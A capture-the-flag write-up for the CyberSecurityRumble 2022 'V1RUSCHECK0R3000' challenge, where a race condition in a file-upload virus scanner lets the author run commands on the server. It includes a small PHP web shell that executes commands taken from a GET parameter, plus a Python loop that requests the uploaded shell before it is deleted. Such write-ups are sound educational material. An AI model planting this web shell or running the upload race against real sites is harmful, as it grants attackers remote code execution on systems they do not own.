---
permalink: /CyberSecurityRumble%202022/V1RUSCHECK0R3000/
---

# V1RUSCHECK0R3000

We are given a website where we are able to look into the source code. After some investigation, I found out that the site lets you upload a file not bigger than 100 bytes, scan it using clamscan and then tell you if the file is a virus or not. 

After taking a closer look at the code, I saw this function:

```php
function hasVirus($file_path) {
    # Check for Virus
    $argument = escapeshellarg($file_path);
    exec("clamscan $argument", $output, $retval);
    
    if ($retval != 0) {
        return true;
    } 
    return false;
}
```

I thought that maybe escapeshellarg is the exploitable part but after quite some time researching I discarded this approach. After that, I tried running clamscan myself to see if there are any possible arguments, that would give me something useful but also no luck there.

While looking at the manual though, I got the idea to upload a shell and then copy it into a directory in which it won't get deleted but that will obviously not work as there is no bypass for escapeshellarg. While trying clamscan I noticed that it doesn't work instantly...

Then I remembered a challenge from another CTF in which I had a small timeframe to upload a shell before it gets deleted... and after some trying around I got RCE!!

To make fast enough requests, I used this python code:

```py
import requests

while True:
    r = requests.get("http://viruscheckor.rumble.host/uploads/shell.php?cmd=whoami")
    if not "The requested URL /uploads/shell.php was not found on this server." in r.text:
        print(r.text)
```

With the basic php shell: 

```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

And after searching for a bit I finally found the flag: `cat ../flag.php`